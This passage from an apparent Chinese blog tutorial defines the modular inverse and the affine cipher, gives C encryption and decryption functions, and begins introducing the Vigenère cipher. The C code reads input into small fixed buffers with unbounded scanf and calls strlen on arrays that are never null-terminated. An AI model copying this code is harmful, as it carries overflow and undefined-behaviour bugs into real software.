<li>定义1：设<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mo>∈</mo><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">a\in Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，若存在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mo>∈</mo><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">a^{&#x27;}\in Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.98158em;vertical-align:-0.0391em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，使得<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><msup><mi>a</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup><mo>≡</mo><mi>a</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup><mi>a</mi><mo>≡</mo><mn>1</mn><mo stretchy="false">(</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">aa^{&#x27;}\equiv a{&#x27;}a\equiv 1(mod\;m)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord"><span class="mord"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mopen">(</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span><span class="mclose">)</span></span></span></span>，则<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><msup><mrow></mrow><mo mathvariant="normal">′</mo></msup></msup></mrow><annotation encoding="application/x-tex">a^{&#x27;}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.94248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.94248em;"><span style="top:-2.94248em;margin-right:0.05em;"><span class="pstrut" style="height:2.57948em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span></span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span>称为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi></mrow><annotation encoding="application/x-tex">a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">a</span></span></span></span> 在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mi>m</mi></msub></mrow><annotation encoding="application/x-tex">Z_m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.151392em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">m</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> 上的乘法逆，将其记为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mi>m</mi></mrow><annotation encoding="application/x-tex">a^{-1}mod\;m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">m</span></span></span></span>。在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>是固定的情形下，也可将其记为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup></mrow><annotation encoding="application/x-tex">a^{-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<h3 id="密码体制-3"><a class="markdownIt-Anchor" href="#密码体制-3"></a> 密码体制</h3>
<ul>
<li>
<p>令<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>P</mi><mo>=</mo><mi>C</mi><mo>=</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">P=C=Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，且<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mrow><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub><mo>×</mo><msub><mi>Z</mi><mn>26</mn></msub><mo>:</mo><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mn>26</mn><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow></mrow><annotation encoding="application/x-tex">K={(a,b)\in Z_{26}\times Z_{26}:gcd(a,26)=1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">:</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">c</span><span class="mord mathdefault">d</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">2</span><span class="mord">6</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">1</span></span></span></span></span></p>
<p>对任意的<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>K</mi><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mo>∈</mo><mi>K</mi><mo separator="true">,</mo><mtext>  </mtext><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo>∈</mo><msub><mi>Z</mi><mn>26</mn></msub></mrow><annotation encoding="application/x-tex">K=(a,b)\in K,\;x,y\in Z_{26}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>，定义<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>e</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>a</mi><mi>x</mi><mo>+</mo><mi>b</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn></mrow><annotation encoding="application/x-tex">e_k(x)=(ax+b)mod\;26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>和<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>d</mi><mi>k</mi></msub><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mi>a</mi><mrow><mo>−</mo><mn>1</mn></mrow></msup><mo stretchy="false">(</mo><mi>y</mi><mo>−</mo><mi>b</mi><mo stretchy="false">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mtext>  </mtext><mn>26</mn></mrow><annotation encoding="application/x-tex">d_k(y)=a^{-1}(y-b)mod\;26</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathdefault">a</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">b</span><span class="mclose">)</span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord">2</span><span class="mord">6</span></span></span></span>。</p>
</li>
<li>
<p>密钥K=(a,b),接下来以书本上的K=(7,3)举例进行代码实现。</p>
</li>
</ul>
<h3 id="代码实现-3"><a class="markdownIt-Anchor" href="#代码实现-3"></a> 代码实现</h3>
<ul>
<li>
<p>加密函数如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_E</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">char</span> p[<span class="number">100</span>],c[<span class="number">100</span>];</span><br><span class="line">      <span class="keyword">int</span> a,b;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入明文串：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;p);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">      <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;A&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">if</span>((p[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(p[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">              c[i]=(a*(p[i]-<span class="string">&#x27;a&#x27;</span>)+b)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,c[i]);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>加密效果如下：<br />
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418125910.png" alt="alt 仿射密码加密" /></p>
</li>
<li>
<p>解密算法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Affine_D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> p[<span class="number">10</span>],c[<span class="number">10</span>];</span><br><span class="line">    <span class="keyword">int</span> a,b,r;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密文串：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入密钥K：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;a,&amp;b);</span><br><span class="line">    <span class="keyword">for</span>(r=<span class="number">0</span>;r&lt;<span class="number">26</span>;r++)</span><br><span class="line">        <span class="keyword">if</span>(a*r%<span class="number">26</span>==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(c);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;A&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;A&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>((c[i]&gt;=<span class="string">&#x27;a&#x27;</span>)&amp;&amp;(c[i]&lt;=<span class="string">&#x27;z&#x27;</span>))</span><br><span class="line">            p[i]=r*(c[i]-<span class="string">&#x27;a&#x27;</span>-b+<span class="number">26</span>)%<span class="number">26</span>+<span class="string">&#x27;A&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;密文串为：&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(p);i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,p[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>解密效果如下：<br />
<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210418131238.png" alt="alt 仿射密码解密" /></p>
</li>
</ul>
<h2 id="维吉尼亚密码"><a class="markdownIt-Anchor" href="#维吉尼亚密码"></a> 维吉尼亚密码</h2>
<h3 id="介绍-4"><a class="markdownIt-Anchor" href="#介绍-4"></a> 介绍</h3>
<ul>
<li>前面介绍的可以归结为单表代换密码，一旦密钥被选定，则每个字母对应的数字都被加密变换成对应的唯一数字，很容易被破解。下面介绍的维吉尼亚密码<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo stretchy="false">(</mo><mi>V</mi><mi>i</mi><mi>g</mi><mi>e</mi><mi>n</mi><mi>e</mi><mi>r</mi><mi>e</mi><mtext>  </mtext><mi>C</mi><mi>i</mi><mi>p</mi><mi>h</mi><mi>e</mi><mi>r</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">(Vigenere\; Cipher)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.22222em;">V</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="mord mathdefault">e</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mord mathdefault" style="margin-right:0.07153em;">C</span><span class="mord mathdefault">i</span><span class="mord mathdefault">p</span><span class="mord mathdefault">h</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mclose">)</span></span></span></span>是一种多表代换密码。</li>
<li>维吉尼亚密码一次加密<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mtext>  </mtext></mrow><annotation encoding="application/x-tex">m\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>个字符，对应的密钥字为<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi></mrow><annotation encoding="application/x-tex">m</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">m</span></span></span></span>个字符组成的串，对明文进行分组处理，处理的结果仍在<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>Z</mi><mn>26</mn></msub><mtext>  </mtext></mrow><annotation encoding="application/x-tex">Z_{26}\;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span></span></span>下的运算。</li>
</ul>
